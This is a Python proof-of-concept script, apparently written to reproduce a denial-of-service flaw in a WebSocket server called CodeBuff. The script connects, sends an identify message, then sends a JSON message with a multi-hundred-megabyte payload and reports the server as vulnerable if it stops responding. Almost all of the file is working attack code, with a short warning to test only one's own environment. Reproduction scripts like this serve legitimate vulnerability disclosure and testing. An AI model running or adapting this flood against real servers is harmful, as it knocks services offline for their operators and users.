#!/usr/bin/env python3
"""
DoS vulnerability reproduction script for CodeBuff WebSocket message router.

This script demonstrates how a malicious client can cause a DoS attack
by sending an extremely large JSON payload through the WebSocket connection.
"""

import asyncio
import json
import sys
import time
import websockets
from websockets.exceptions import ConnectionClosed


async def test_dos_vulnerability(websocket_url: str, payload_size_mb: int = 50):
    """
    Test the DoS vulnerability by sending a large JSON payload.

    Args:
        websocket_url: WebSocket server URL (e.g., "ws://localhost:8000/ws")
        payload_size_mb: Size of the malicious payload in megabytes
    """
    print(f"[*] Connecting to WebSocket server at {websocket_url}")

    try:
        async with websockets.connect(websocket_url) as websocket:
            print("[*] Connected successfully")

            # Step 1: Send a valid identify message first
            identify_msg = {
                "type": "identify",
                "clientSessionId": "test-session-dos",
                "txid": 1,
            }

            print("[*] Sending identify message...")
            await websocket.send(json.dumps(identify_msg))

            # Wait for ack
            response = await websocket.recv()
            response_data = json.loads(response)

            if not response_data.get("success"):
                print(f"[-] Identify failed: {response_data}")
                return False

            print("[*] Identify successful, proceeding with DoS test")

            # Step 2: Create malicious payload
            print(f"[*] Creating {payload_size_mb}MB malicious JSON payload...")

            # Create a deeply nested JSON structure that's expensive to parse
            large_data = "x" * (payload_size_mb * 1024 * 1024)  # Large string
            malicious_payload = {
                "type": "ping",
                "txid": 2,
                "largeData": large_data,
                "nested": {
                    "more": {
                        "deep": {
                            "structures": [large_data] * 100  # Multiple large elements
                        }
                    }
                },
            }

            payload_json = json.dumps(malicious_payload)
            actual_size_mb = len(payload_json) / (1024 * 1024)
            print(f"[*] Payload size: {actual_size_mb:.2f}MB")

            # Step 3: Send the malicious payload and time the parsing
            print(
                "[*] Sending malicious payload (this may cause high CPU/memory usage)..."
            )
            start_time = time.time()

            await websocket.send(payload_json)

            # Try to receive response (may timeout if server is overloaded)
            try:
                response = await asyncio.wait_for(websocket.recv(), timeout=30.0)
                end_time = time.time()
                parse_time = end_time - start_time

                print(f"[!] Server responded in {parse_time:.2f} seconds")
                print("[!] DoS may have been unsuccessful - server handled the payload")

                return False

            except asyncio.TimeoutError:
                end_time = time.time()
                parse_time = end_time - start_time

                print("[!] Server did not respond within 30 seconds")
                print(f"[!] Parse time: {parse_time:.2f} seconds")
                print(
                    "[!] This indicates a successful DoS attack - server is overwhelmed"
                )

                return True

    except ConnectionClosed as e:
        print(f"[!] Server closed connection: {e}")
        print("[!] This may indicate the server crashed or rejected the connection")
        return True

    except Exception as e:
        print(f"[-] Error during test: {e}")
        return False


async def main():
    """Main function to run the DoS test."""
    if len(sys.argv) < 2:
        print("Usage: python dos_websocket_repro.py <websocket_url> [payload_size_mb]")
        print("Example: python dos_websocket_repro.py ws://localhost:8000/ws 50")
        sys.exit(1)

    websocket_url = sys.argv[1]
    payload_size_mb = int(sys.argv[2]) if len(sys.argv) > 2 else 50

    print("=" * 60)
    print("CodeBuff WebSocket DoS Vulnerability Reproduction")
    print("=" * 60)
    print(f"Target: {websocket_url}")
    print(f"Payload size: {payload_size_mb}MB")
    print()

    # Warning
    print("[!] WARNING: This test may cause high CPU/memory usage on the target server")
    print("[!] Only run this against your own test environment")
    print()

    try:
        vulnerable = await test_dos_vulnerability(websocket_url, payload_size_mb)

        print()
        print("=" * 60)
        print("RESULTS:")
        print("=" * 60)

        if vulnerable:
            print("[VULNERABLE] The server appears to be vulnerable to DoS attacks")
            print("            via large JSON payloads in WebSocket messages")
        else:
            print(
                "[NOT VULNERABLE] The server handled the large payload without issues"
            )

    except KeyboardInterrupt:
        print("\n[!] Test interrupted by user")

    except Exception as e:
        print(f"\n[-] Test failed with error: {e}")


if __name__ == "__main__":
    asyncio.run(main())
